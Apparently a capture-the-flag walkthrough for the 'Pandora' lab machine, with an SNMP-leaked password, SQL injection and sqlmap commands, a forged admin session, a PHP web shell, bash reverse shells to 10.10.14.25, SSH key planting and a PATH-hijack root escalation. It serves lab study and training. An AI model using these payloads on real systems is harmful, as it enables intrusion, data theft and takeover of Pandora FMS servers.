- 10.10.11.136 leads to panda.htb web page
- added to /etc/hosts
- nmap shows port 80 http and port 22 ssh
```
nmap 10.10.11.136
nmap -sV -sT 10.10.11.136
```
- Linux OS
- Apache Server 2.4.41
- dirsearch finds assets subdirectory
```
diresearch -u http://panda.htb
```
- Assets shows a directory list with .svg images
- maybe there is a file upload vulnerability?
- XXE /XSSVulnerability
- github link:
		https://github.com/makeplane/plane/security/advisories/GHSA-rcg8-g69v-x23j
- The application allows users to upload SVG files as profile images without proper sanitization. SVG files can contain embedded JavaScript code that executes when the image is rendered in a browser. This creates an XSS vulnerability where malicious code can be executed in the context of other users' sessions.
- How to upload file now..
- many loophles, the assets hold images, one of the images talks of plainadmin website. there are svg vulnerabilities. fuzzing and subdomain search is a bit difficult as pages return true always.
--------
- **But the key is to check udp ports for nmap**
```
nmap -sU 10.10.11.136 #slower 
nmap -sU --min-rate=5000 10.10.11.136 #faster
```
## SNMP Enumration
- perform snmpwalk
```
	snmpwalk -v 1 -c public 10.10.11.136
```
- We find a username and password:
```
iso.3.6.1.2.1.25.4.2.1.5.1101 = STRING: "-u daniel -p HotelBabylon23"
```
- can ssh into machine as this user **but we cannot access user flag as its for user matt**
## More enumeration
- uname -a gives 
- Linux pandora 5.4.0-91-generic #102-Ubuntu SMP Fri Nov 5 16:31:28 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
- searchsploit pandora gives a bunch of exploits
- i found a ruby exploit but cant seem to transfer the file
- searching /var/www/
- we find pandora extra folder with pandora console
- this implies there maybe another virtual host
- search /etc/apache2/sites-available
- we see in pandora.conf there is a locally hosted site
- pandora.panda.htb hosted locally on 80
- **New technique**
- now to get access to this site we need to forward it to our localhost via a port
- ssh into daniel again but with -L to set a listener port which will forward this localhost to our machine's localhost ip
```
ssh -L 9090:127.0.0.1:80 daniel@panda.htb
```
- to check pass this command on your local machine to check if ssh is listening
```
ss -lntp | grep "9090"
```
- add pandora.panda.htb to localhost in /etc/hosts
- access url via port 9090 to get login screen
----------
## Login Page Enumeration
- Googling the version of Pandora FMS v7.0NG.742_FIX_PERL2020
- we find RCE exploit
- https://www.sonarsource.com/blog/pandora-fms-742-critical-code-vulnerabilities-explained/
- sql database in there
- in line 72 of _chart_generator.php_, the user input is fetched from the `$_REQUEST` superglobal which contains GET and POST parameters, as well as cookie values. The latter is probably the reason why `get_parameter()` was not used here. The user input **`$_REQUEST['session_id']`** is passed to the constructor of the class `PandoraFMS\User` without any sanitization.
- chart generator is vulnerable
- /include path : checked url and leads to a directory with chat_generator.php file
- https://www.exploit-db.com/exploits/50961
- need to capture session id to use for sqlmap
- since we know we attack the session id of chat_generator.php
```
http://pandora.panda.htb:9090/pandora_console/include/chart_generator.php?session_id=' show datases or 1=1-- -
```
- we get sql error showing its vulnerable to SQLi
## SQLMAP enumeration
- enumerate with sqli 
```
sqlmap -u "http://pandora.panda.htb:9090/pandora_console/include/chart_generator.php?session_id=*" --batch --level=5 --risk=3 -D pandora -T tsessions_php --dump
```
- FIRST PASSWD --dbs, found a database, then --tables to find tables then --dump a table step by step
- found matt session_id
- added the session id to my url
- went back to pandora.panda.htb:9090 and was logged in
-  however Im not admin so only limited functionality
----
- **ALTERNATE METHOD FOR admin access to page (binary analysis) HARD FIND**
- checking the table again we see
- id_usuario|s:6:"daniel"
- somethign similar for matt
- the s value represents the characters (daniel is 6 characters)
- add this to url :
```
http://pandora.panda.htb:9090/pandora_console/include/chart_generator.php?sessionid=' union select 1,2,'id_usuario|s:5:"admin";'-- -
```
- we get no error message and refreshion pandora.panda.htb:9090 we get admin access
- we try to upload php code into file manager (shows its in image directory so can url into pandora_console/images to see and execute)
- Three methods:
- upload pentest monkeys php reverse shell with creds and listen on port.
- manually we can create a php code that calls a command line
```
<?php
system($_REQUEST['cmd']);
?>
```
- Upload and open file in images directory
- pass url to check if working
```
http://pandora.panda.htb:9090/pandora_console/images/shell.php?cmd=whoami
```
- we get response matt
- open burpsuite and capture this
- change request type to post
- pass this command at the bottom (a blank line in between the request and this)
```
cmd=bash -c 'bash -i >& /dev/tcp/10.10.14.25/9998 0>&1'
```
- Select everything from after "cmd=" and press Ctrl+U to url encode and then send the packet while listening on port 9998.
- we get reverse shell 
-----------
- **Another way to get reverse shell without admin access**
- php ajax.php vulnerability
- capture packets via burp suite as matt logs in
- we find an ajax.php file
- https://www.coresecurity.com/core-labs/advisories/pandora-fms-community-multiple-vulnerabilities
- can execute exploit in this post request
```
page=include/ajax/events&perform_event_response=10000000
&**target=bash -c 'bash -i >& /dev/tcp/10.10.14.25/9998 0>&1'&response_id=1
```
- we also need to url encode it (Ctrl+U in Burp Suite)
```
page=include/ajax/events&perform_event_response=10000000
&target=bash+-c+'bash+-i+>%26+/dev/tcp/10.10.14.25/9997+0>%261'&response_id=1
```
- have netcat listener listening on port 9997
- to gain access at matt user
## Privilege escalation
- on enumerating we do 
```
find / -type f -perm -4000 2>/dev/null
```
- and we find pandora_backup with root priv
- yet we cant execute it
- this is due to a restricted shell
- why? we tried sudo -l and it gave a weird error:
```
sudo: PERM_ROOT: setresuid(0, -1, -1): Operation not permitted
sudo: unable to initialize policy plugin
```
- https://gtfobins.github.io/gtfobins/at/#shell
- can use at to break of of restricted shell
```
# tried but didnt work
```
- alternatively, create a ssh key in your local machine and send it to target "
```
python -m http.server:8001 # where you have the key
in target matchine /home/matt.ssh: wget 10.10.14.25:8001/matt.pub #get public key to .ssh directory
mv matt.pub authorized_keys
chmod 600 authorized_keys # VERY IMPORTANT
in local machine : chmod 600 matt
ssh -i matt matt@10.10.11.136 # should not get password prompt
```
- then in shell create tar file and make it executable with /bin/bash as entry(why? if you look at pandora_backup which we want to execute, that is the command which gets use root)
- create path to current directory
```
echo /bin/bin > tar
chmod +x tar
export PATH=$(pwd):$PATH
echo $PATH # should show current direvtory first now
/usr/bin/pandora_backup
```
- we gain root access
-------
## The Priv Esc exploit in pandora_backup
- on doing strings or Ghidra we can find the main code of pandora_backup
```
PandoraFMS Backup Utility
Now attempting to backup PandoraFMS client
tar -cvf /root/.backup/pandora-backup.tar.gz /var/www/pandora/pandora_console/*
```
- we create atar file with the command /bin/bash into it and make it executable. 
- Furthermore we check the $PATH as thats what the command path checks when executing. We change this to our current directory 
```
export PATH=$(pwd):$PATH
echo $PATH
```
- then we execute pandora_backup which calls that command but since there is a tar executable in our current working directory.
- since this runs as setuid it runs as root so hen /bin/bash is executed in our altered tar executable, it executes the root shell for us.

